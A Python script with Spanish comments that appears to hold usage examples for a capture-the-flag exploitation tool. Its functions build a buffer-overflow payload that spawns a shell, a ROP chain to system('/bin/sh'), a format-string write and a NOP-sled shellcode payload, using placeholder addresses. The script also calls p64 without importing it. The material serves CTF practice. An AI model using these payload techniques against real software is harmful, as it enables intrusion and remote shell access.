#!/usr/bin/env python3
"""
Ejemplos de uso de la herramienta PWN CTF
"""

from pwn_ctf_tool import PWNTool

def example_buffer_overflow():
    """Ejemplo de buffer overflow básico"""
    print("\n=== EJEMPLO: Buffer Overflow ===")
    
    pwn = PWNTool()
    
    # 1. Encontrar offset
    binary_path = "./vulnerable_binary"  # Cambiar por tu binario
    offset = pwn.find_offset(binary_path)
    
    if offset:
        # 2. Crear payload
        payload = b"A" * offset
        payload += p64(0x401234)  # Dirección de retorno
        
        # 3. Conectar y enviar
        if pwn.connect_local(binary_path):
            pwn.send_payload(payload)
            pwn.interactive_shell()

def example_rop_chain():
    """Ejemplo de cadena ROP"""
    print("\n=== EJEMPLO: ROP Chain ===")
    
    pwn = PWNTool()
    binary_path = "./rop_binary"  # Cambiar por tu binario
    
    # Buscar gadgets necesarios
    pop_rdi = pwn.find_gadgets(binary_path, "pop_rdi")
    ret_gadget = pwn.find_gadgets(binary_path, "ret")
    
    if pop_rdi and ret_gadget:
        # Construir payload ROP
        offset = 72  # Offset conocido
        
        payload = b"A" * offset
        payload += p64(pop_rdi)      # pop rdi; ret
        payload += p64(0x601234)     # /bin/sh string
        payload += p64(0x400567)     # system() address
        
        print(f"Payload ROP: {len(payload)} bytes")

def example_format_string():
    """Ejemplo de format string"""
    print("\n=== EJEMPLO: Format String ===")
    
    pwn = PWNTool()
    
    # Parámetros del exploit
    offset = 6  # Offset en el stack
    target_addr = 0x601234  # Dirección a sobrescribir
    value = 0x41414141     # Valor a escribir
    
    # Generar payload
    payload = pwn.format_string_exploit(offset, target_addr, value)
    
    if payload:
        print(f"Format string payload generado: {len(payload)} bytes")

def example_shellcode_injection():
    """Ejemplo de inyección de shellcode"""
    print("\n=== EJEMPLO: Shellcode Injection ===")
    
    pwn = PWNTool()
    
    # Generar shellcode
    shellcode = pwn.generate_shellcode("amd64", "sh")
    
    if shellcode:
        # Crear payload con NOP sled
        nop_sled = b"\x90" * 100
        payload = nop_sled + shellcode
        
        print(f"Payload con shellcode: {len(payload)} bytes")

if __name__ == "__main__":
    print("Ejemplos de uso de PWN CTF Tool")
    print("Descomenta las funciones que quieras probar")
    
    # example_buffer_overflow()
    # example_rop_chain()
    # example_format_string()
    # example_shellcode_injection()